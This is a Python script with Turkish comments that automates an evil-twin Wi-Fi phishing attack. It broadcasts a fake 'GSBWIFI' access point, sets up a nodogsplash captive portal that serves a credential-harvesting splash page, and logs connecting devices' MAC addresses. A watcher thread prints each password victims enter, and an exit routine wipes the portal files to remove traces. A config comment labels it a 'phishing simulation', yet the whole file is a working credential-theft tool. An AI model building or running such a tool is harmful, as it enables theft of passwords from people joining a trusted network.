import subprocess
import os
import time
import signal
import sys
import threading
import re
import argparse
from datetime import datetime

# --- AYARLAR & RENKLER ---
GREEN, RED, YELLOW, CYAN, NC = '\033[0;32m', '\033[0;31m', '\033[1;33m', '\033[0;36m', '\033[0m'
LOG_FILE = "gsb_activity.log"
PASS_FILE = "/etc/nodogsplash/passwords.txt"
NDS_CONFIG = "/etc/nodogsplash/nodogsplash.conf"

# --- DINAMIK YOLLAR ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOCAL_PORTAL = os.path.join(BASE_DIR, "portal_files")
NDS_HTDOCS = "/etc/nodogsplash/htdocs"
LOGGER_PATH = os.path.join(NDS_HTDOCS, "backend/logger.py")

print_lock = threading.Lock()
active_clients = set() 

# --- BAĞIMLILIKLAR ---
REQUIRED_PACKAGES = ["create_ap", "nodogsplash", "dnsmasq", "python3", "fuser", "iw"]

# --- ARGÜMAN YÖNETİMİ ---
parser = argparse.ArgumentParser(description='GSB-WIFI Otomasyon Paneli')
parser.add_argument('-i', '--interface', help='Yayın yapılacak Wi-Fi kartı')
parser.add_argument('-s', '--ssid', default='GSBWIFI', help='Yayınlanacak ağ adı')
args = parser.parse_args()

def write_to_log(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clean_msg = re.sub(r'\033\[[0-9;]*m', '', message)
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {clean_msg}\n")

def safe_print(msg, log_it=True):
    with print_lock:
        sys.stdout.write(f"\r\033[K{msg}\n")
        sys.stdout.flush()
    if log_it:
        write_to_log(msg)

def check_dependencies():
    missing = []
    for pkg in REQUIRED_PACKAGES:
        check = subprocess.run(["which", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if check.returncode != 0:
            missing.append(pkg)
    
    if missing:
        print(f"{RED}[!] HATA: Sistemde gerekli araçlar bulunamadı: {', '.join(missing)}{NC}")
        print(f"{YELLOW}[*] Çözüm Yolları:{NC}")
        print(f"  1. Paket yöneticisi ile kurmayı deneyin:")
        print(f"     sudo apt update && sudo apt install create_ap nodogsplash dnsmasq")
        print(f"  2. Eğer araçları manuel kurduysanız, /usr/bin veya /usr/sbin altında")
        print(f"     olduklarından ve isimlerinin doğru olduğundan emin olun.")
        print(f"  3. GitHub üzerinden manuel kurulum için her aracın kendi dökümantasyonuna bakın.")
        sys.exit(1)

# --- OTOMATIK PORTAL VE CONFIG KURULUMU ---
def setup_portal_files():
    if not os.path.exists(LOCAL_PORTAL):
        print(f"{RED}[!] HATA: '{LOCAL_PORTAL}' klasörü bulunamadı!{NC}")
        sys.exit(1)
    subprocess.run(["sudo", "rm", "-rf", NDS_HTDOCS], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "mkdir", "-p", NDS_HTDOCS], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "cp", "-a", f"{LOCAL_PORTAL}/.", NDS_HTDOCS], check=True)
    subprocess.run(["sudo", "chmod", "+x", LOGGER_PATH], stderr=subprocess.DEVNULL)

def setup_nds_config(interface, gateway_ip="192.168.12.1"):
    nds_config_template = f"""
# GSB-WIFI Phishing Simulation Config
GatewayInterface {interface}
GatewayAddress {gateway_ip}
MaxClients 250
AuthIdleTimeout 120

FirewallRuleSet authenticated-users {{
    FirewallRule allow all
}}

FirewallRuleSet preauthenticated-users {{
    FirewallRule allow tcp port 53
    FirewallRule allow udp port 53
    FirewallRule allow tcp port 8000
    FirewallRule allow udp port 8000
}}

FirewallRuleSet users-to-router {{
    FirewallRule allow udp port 53
    FirewallRule allow tcp port 53
    FirewallRule allow udp port 67
    FirewallRule allow tcp port 22
    FirewallRule allow tcp port 80
    FirewallRule allow tcp port 443
    FirewallRule allow tcp port 8000
}}

EmptyRuleSetPolicy authenticated-users passthrough
EmptyRuleSetPolicy preauthenticated-users block
EmptyRuleSetPolicy users-to-router block
"""
    try:
        if not os.path.exists(NDS_CONFIG + ".bak"):
            subprocess.run(["sudo", "cp", NDS_CONFIG, NDS_CONFIG + ".bak"], stderr=subprocess.DEVNULL)
            
        with open("temp_nds.conf", "w") as f:
            f.write(nds_config_template)
            
        subprocess.run(["sudo", "mv", "temp_nds.conf", NDS_CONFIG], check=True)
        safe_print(f"[*] Config Yapılandırıldı ({CYAN}{interface}{NC})")
    except Exception as e:
        safe_print(f"{RED}[!] HATA: Config oluşturulamadı: {e}{NC}")

def setup_html_gateway_fix():
    try:
        output = subprocess.check_output(["ip", "-4", "addr", "show"], text=True)
        match = re.search(r"inet (192\.168\.[0-9]+\.[0-9]+)", output)
        gateway = match.group(1) if match else "192.168.12.1"
        splash_file = os.path.join(NDS_HTDOCS, "splash.html")
        if os.path.exists(splash_file):
            sed_cmd = r"sudo sed -i -E 's/192\.168\.[0-9]+\.[0-9]+/{gateway}/g' " + splash_file
            subprocess.run(sed_cmd, shell=True)
            safe_print(f"[*] Portal Gateway Fix: {CYAN}{gateway}{NC}")
    except: pass

def clean_exit(sig, frame):
    sys.stdout.write(f"\r\033[K{YELLOW}[!] Çıkılıyor...{NC}\n")
    sys.stdout.flush()
    write_to_log("OPERASYON DURDURULDU.")
    DEVNULL = subprocess.DEVNULL
    
    subprocess.run(["sudo", "pkill", "-9", "-f", "nodogsplash"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "pkill", "-9", "-f", "create_ap"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "pkill", "-9", "-f", "logger.py"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "pkill", "-9", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
    
    # IZLERI TEMIZLE & CONFIG GERI YUKLE
    subprocess.run(["sudo", "rm", "-rf", NDS_HTDOCS], stdout=DEVNULL, stderr=DEVNULL)
    if os.path.exists(NDS_CONFIG + ".bak"):
        subprocess.run(["sudo", "mv", NDS_CONFIG + ".bak", NDS_CONFIG], stdout=DEVNULL, stderr=DEVNULL)
    
    subprocess.run(["sudo", "systemctl", "start", "systemd-resolved"], stdout=DEVNULL, stderr=DEVNULL)
    os.system('stty sane')
    safe_print(f"{CYAN}----------------------------------------------{NC}")
    print(f"\n{CYAN}[i] Operasyon Özeti:{NC}")
    print(f"    - Tüm loglar: {os.path.abspath(LOG_FILE)}")
    print(f"    - Ele geçirilen veriler: {PASS_FILE}")
    print(f"{GREEN}[+] Bitti.{NC}")
    sys.stdout.flush()
    
    os._exit(0)
    
    os._exit(0)

signal.signal(signal.SIGINT, clean_exit)

def get_interfaces():
    try:
        output = subprocess.check_output(["iw", "dev"], text=True)
        return re.findall(r"Interface\s+(.+)", output)
    except: return []

def password_watcher():
    if not os.path.exists(PASS_FILE): open(PASS_FILE, 'a').close()
    with open(PASS_FILE, "r") as f:
        f.seek(0, os.SEEK_END)
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.5)
                continue
            safe_print(f"{RED}[!!!] ŞİFRE DÜŞTÜ:{NC}")
            safe_print(f"{GREEN}  > {line.strip()}{NC}")
            safe_print(f"{CYAN}----------------------------------------------{NC}")

def run():
    check_dependencies()
    setup_portal_files()
    
    ifaces = get_interfaces()
    all_sys_ifaces = os.listdir('/sys/class/net')

    os.system('clear')
    print(f"{CYAN}=============================================={NC}")
    print(f"{YELLOW}          GSBWIFI OPERASYON PANELI             {NC}")
    print(f"{CYAN}=============================================={NC}")

    if args.interface:
        INTERFACE = args.interface
    else:
        if not ifaces: 
            print(f"{RED}[!] Wi-Fi kartı bulunamadı!{NC}")
            return
        for i, iface in enumerate(ifaces): print(f"  {i+1}) {iface}")
        idx1 = int(input("Yayın Kartı Seçin: ")) - 1
        INTERFACE = ifaces[idx1]

    setup_nds_config(INTERFACE)

    INTERNET_INT = "lo"
    for iface in all_sys_ifaces:
        if iface != INTERFACE and iface != "lo" and not iface.startswith("veth"):
            INTERNET_INT = iface
            break

    safe_print(f"[*] SSID  : {GREEN}{args.ssid}{NC}")
    safe_print(f"[*] Yayın : {GREEN}{INTERFACE}{NC}")
    safe_print(f"[*] Kaynak: {YELLOW}{INTERNET_INT}{NC}")

    subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], stderr=subprocess.DEVNULL)
    
    cmd = ["sudo", "create_ap", "--no-virt", "-m", "nat", INTERFACE, INTERNET_INT, args.ssid]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

    time.sleep(5) 
    setup_html_gateway_fix()
    
    # Servisleri Başlat
    subprocess.Popen(["sudo", "python3", LOGGER_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "systemctl", "restart", "dnsmasq"], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "nodogsplash"], stderr=subprocess.DEVNULL)
    subprocess.Popen(["sudo", "nodogsplash"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    safe_print(f"{GREEN}[!] SİSTEM HAZIR. Dinleniyor...{NC}")
    threading.Thread(target=password_watcher, daemon=True).start()

    while True:
        line = proc.stdout.readline()
        if not line: break
        mac_m = re.search(r'([a-fA-F0-9]{2}[:|\-]){5}[a-fA-F0-9]{2}', line)
        if mac_m:
            mac = mac_m.group().lower()
            if any(x in line.lower() for x in ["disconn", "disassoc", "deauth", "expired", "removed"]):
                if mac in active_clients:
                    active_clients.remove(mac)
                    safe_print(f"{RED}[-] BAĞLANTI KESİLDİ: {mac}{NC}")
            elif any(x in line.lower() for x in ["assoc", "auth", "connected", "dhcpack"]):
                if "dis" not in line.lower() and mac not in active_clients:
                    active_clients.add(mac)
                    safe_print(f"{YELLOW}[+] YENİ BAĞLANTI: {mac}{NC}")

if __name__ == "__main__":
    run()
